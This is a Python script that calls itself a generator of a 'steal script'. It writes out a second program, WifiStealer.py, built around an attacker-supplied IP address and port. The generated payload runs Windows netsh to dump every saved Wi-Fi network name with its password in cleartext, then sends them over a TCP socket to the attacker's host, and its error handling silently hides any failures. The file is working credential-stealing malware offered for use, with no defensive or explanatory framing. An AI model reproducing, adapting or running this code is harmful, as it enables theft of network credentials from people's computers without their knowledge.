import argparse

print('WifiGenerate generate a steal script')

# Define the argument parser
parser = argparse.ArgumentParser(prog="WifiGenerate.py", usage="%(prog)s [--help]")
parser.add_argument("-ip", action="store", help="Get the ip", default='127.0.0.1')
parser.add_argument("-port", action="store", help="Get the port",  default=4444)
parser.add_argument("-version", action="version",  version="%(prog)s 1.0")

# Parse the arguments\

args = parser.parse_args()


if args.ip and args.port:
    code = f"""
import socket
import subprocess


# Ip
HOST = "{args.ip}"
# Port
PORT = {args.port}

try:
    # Connect to ip
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    # hook the password
    def main():
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split("\\n")
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                try:
                    msg = ("SSID:{{:<30}}Password:{{:<}}".format(i, results[0]))
                    # send to server
                    s.send(bytes(msg, 'utf-8'))
                except IndexError:
                    print ("{{:<30}}|  {{:<}}".format(i, ""))
            except subprocess.CalledProcessError:
                print ("{{:<30}}|  {{:<}}".format(i, "ENCODING ERROR"))
                s.send(bytes('error sending password', 'utf-8'))


    main()

except:
    pass

"""

    # Write the new function and argument parser to a file
    with open("WifiStealer.py", "w") as f:
        f.write(code)

    print(f'Script successfully created on IP {args.ip} and port {args.port}\nYou can use --help')

else:
    pass